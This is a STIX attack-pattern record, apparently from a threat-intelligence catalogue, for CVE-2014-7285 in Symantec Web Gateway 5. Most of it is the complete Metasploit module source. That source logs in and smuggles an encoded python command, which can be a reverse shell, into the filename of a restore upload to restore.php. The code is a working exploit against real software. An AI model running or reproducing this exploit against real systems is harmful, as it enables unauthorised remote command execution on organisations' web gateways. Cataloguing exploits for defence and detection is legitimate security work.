{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f57efe03-0343-44c3-836f-dff628a81a40",
    "created": "2024-08-14T17:00:45.672817Z",
    "modified": "2024-08-14T17:00:45.672822Z",
    "name": "\"Symantec Web Gateway 5 restore.php Post Authentication Command Injection\"",
    "description": " This module exploits a command injection vulnerability found in Symantec Web Gateway's setting restoration feature. The filename portion can be used to inject system commands into a syscall function, and gain control under the context of HTTP service.  For Symantec Web Gateway 5.1.1, you can exploit this vulnerability by any kind of user. However, for version 5.2.1, you must be an administrator.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/symantec_web_gateway_restore.rb",
            "external_id": "symantec_web_gateway_restore.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-7285"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2014-19"
        },
        {
            "source_name": "reference",
            "url": "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20141216_00"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Symantec Web Gateway 5 restore.php Post Authentication Command Injection\",\n      'Description'    => %q{\n          This module exploits a command injection vulnerability found in Symantec Web\n        Gateway's setting restoration feature. The filename portion can be used to inject\n        system commands into a syscall function, and gain control under the context of\n        HTTP service.\n\n        For Symantec Web Gateway 5.1.1, you can exploit this vulnerability by any kind of user.\n        However, for version 5.2.1, you must be an administrator.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Egidio Romano', # Original discovery & assist of MSF module\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-7285' ],\n          [ 'OSVDB', '116009' ],\n          [ 'BID', '71620' ],\n          [ 'URL', 'http://karmainsecurity.com/KIS-2014-19' ],\n          [ 'URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20141216_00']\n        ],\n      'Payload'        =>\n        {\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic python'\n            }\n        },\n      'DefaultOptions' => {\n        'RPORT'      => 443,\n        'SSL'        => true,\n      },\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['Symantec Web Gateway 5', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-12-16', # Symantec security bulletin (Vendor notified on 8/10/2014)\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI to Symantec Web Gateway', '/']),\n        OptString.new('USERNAME', [true, 'The username to login as']),\n        OptString.new('PASSWORD', [true, 'The password for the username'])\n      ])\n  end\n\n  def protocol\n    ssl ? 'https' : 'http'\n  end\n\n  def check\n    uri = target_uri.path\n    res = send_request_cgi({'uri' => normalize_uri(uri, 'spywall/login.php')})\n\n    if res && res.body.include?('Symantec Web Gateway')\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_sid\n    sid = ''\n\n    uri = target_uri.path\n    res = send_request_cgi({\n      'uri'    => normalize_uri(uri, 'spywall/login.php'),\n      'method' => 'GET',\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while retrieving PHPSESSID')\n    end\n\n    cookies = res.get_cookies\n    sid = cookies.scan(/(PHPSESSID=\\w+);*/).flatten[0] || ''\n\n    sid\n  end\n\n  def login(sid)\n    uri = target_uri.path\n    res = send_request_cgi({\n      'uri'    => normalize_uri(uri, 'spywall/login.php'),\n      'method' => 'POST',\n      'cookie' => sid,\n      'headers' => {\n        'Referer' => \"#{protocol}://#{peer}/#{normalize_uri(uri, 'spywall/login.php')}\"\n      },\n      'vars_post' => {\n        'USERNAME' => datastore['USERNAME'],\n        'PASSWORD' => datastore['PASSWORD'],\n        'loginBtn' => 'Login'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while attempting to login')\n    end\n\n    cookies = res.get_cookies\n    sid = cookies.scan(/(PHPSESSID=\\w+);*/).flatten[0] || ''\n\n    if res.headers['Location'] =~ /executive_summary\\.php$/ && !sid.blank?\n      # Successful login\n      return sid\n    else\n      # Failed login\n      fail_with(Failure::NoAccess, \"Bad username or password: #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n    end\n  end\n\n  def build_payload\n    # At of today (Feb 27 2015), there are only three payloads this module will support:\n    # * cmd/unix/generic\n    # * cmd/unix/reverse_python\n    # * cmd/unix/reverse_python_ssl\n    p = payload.encoded\n\n    case datastore['PAYLOAD']\n    when /cmd\\/unix\\/generic/\n      # Filter that one out, Mr. basename()\n      p = Rex::Text.encode_base64(\"import os ; os.system('#{Rex::Text.encode_base64(p)}'.decode('base64'))\")\n      p = \"python -c \\\"exec('#{p}'.decode('base64'))\\\"\"\n    else\n      p = p.gsub(/python -c \"exec/, 'python -c \\\\\"exec')\n      p = p.gsub(/decode\\('base64'\\)\\)\"/, \"decode('base64'))\\\\\\\"\")\n    end\n\n    p\n  end\n\n  def build_mime\n    p = build_payload\n\n    data = Rex::MIME::Message.new\n    data.add_part(\"#{Time.now.to_i}\", nil, nil, 'form-data; name=\"posttime\"')\n    data.add_part('maintenance', nil, nil, 'form-data; name=\"configuration\"')\n    data.add_part('', 'application/octet-stream', nil, 'form-data; name=\"licenseFile\"; filename=\"\"')\n    data.add_part('24', nil, nil, 'form-data; name=\"raCloseInterval\"')\n    data.add_part('', nil, nil, 'form-data; name=\"restore\"')\n    data.add_part(\"#{Rex::Text.rand_text_alpha(4)}\\n\", 'text/plain', nil, \"form-data; name=\\\"restore_file\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(4)}.txt; #{p}\\\"\")\n    data.add_part('Restore', nil, nil, 'form-data; name=\"restoreFile\"')\n    data.add_part('0', nil, nil, 'form-data; name=\"event_horizon\"')\n    data.add_part('0', nil, nil, 'form-data; name=\"max_events\"')\n    data.add_part(Time.now.strftime(\"%m/%d/%Y\"), nil, nil, 'form-data; name=\"cleanlogbefore\"')\n    data.add_part('', nil, nil, 'form-data; name=\"testaddress\"')\n    data.add_part('', nil, nil, 'form-data; name=\"pingaddress\"')\n    data.add_part('and', nil, nil, 'form-data; name=\"capture_filter_op\"')\n    data.add_part('', nil, nil, 'form-data; name=\"capture_filter\"')\n\n    data\n  end\n\n  def inject_exec(sid)\n    uri = target_uri.path\n    mime = build_mime # Payload inside\n    send_request_cgi({\n      'uri'     => normalize_uri(uri, 'spywall/restore.php'),\n      'method'  => 'POST',\n      'cookie'  => sid,\n      'data'    => mime.to_s,\n      'ctype'   => \"multipart/form-data; boundary=#{mime.bound}\",\n      'headers' => {\n        'Referer' => \"#{protocol}://#{peer}#{normalize_uri(uri, 'spywall/mtceConfig.php')}\"\n      }\n    })\n  end\n\n  def exploit\n    print_status(\"Getting the PHPSESSID...\")\n    sid = get_sid\n    if sid.blank?\n      print_error(\"Failed to get the session ID. Cannot continue with the login.\")\n      return\n    end\n\n    print_status(\"Attempting to log in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n    sid = login(sid)\n    if sid.blank?\n      print_error(\"Failed to get the session ID from the login process. Cannot continue with the injection.\")\n      return\n    else\n      # Good password, keep it\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n    end\n\n    print_status(\"Trying restore.php...\")\n    inject_exec(sid)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-16, # Symantec security bulletin Vendor notified on 8/10/2014",
    "x_mitre_platforms": [
        "['unix']"
    ]
}